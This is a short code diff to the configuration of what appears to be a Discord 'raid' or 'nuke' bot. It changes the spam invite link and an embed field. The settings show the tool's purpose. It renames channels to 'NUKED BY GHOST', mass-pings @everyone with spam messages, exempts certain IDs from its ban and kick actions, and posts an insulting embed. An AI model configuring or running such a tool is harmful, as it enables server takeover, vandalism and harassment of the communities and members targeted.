@@ -14,7 +14,7 @@ AUTO_RAID_CONFIG = {
     'channel_type': 'text',  # text/voice     
     'channel_name': 'NUKED BY GHOST',  # Channel name      
     'num_messages': 30,  # Number of message to spam/better max 30     
-    'message_content': '@everyone JOIN  https://discord.gg/jqPtTZnnb5'# Spam Message     
+    'message_content': '@everyone JOIN  https://discord.gg/4VDJ7MG8da'# Spam Message     
 }
 
 NO_BAN_KICK_ID = {
@@ -34,7 +34,7 @@ EMBED_CONFIG = {
     "color": 0xFF5733,   # Change embed color if you want (red) is 0xFF5733        
     "fields": [
         {"name": "SidOwned", "value": "SidOwned", "inline": False},     
-        {"name": "KolSidOwned", "value": "SidOwned", "inline": False},
+        {"name": "SidOwned", "value": "SidOwned", "inline": False},
         {"name": "SidOwned", "value": "SidOwned", "inline": False},    # Exemple → "name": "Title 1", "value": "Hello, here is my message", "inline": False      
     ],
     "image": "   Ghost owned you motherfuckers",   # Embed Icon url here → https://yourimage.com     
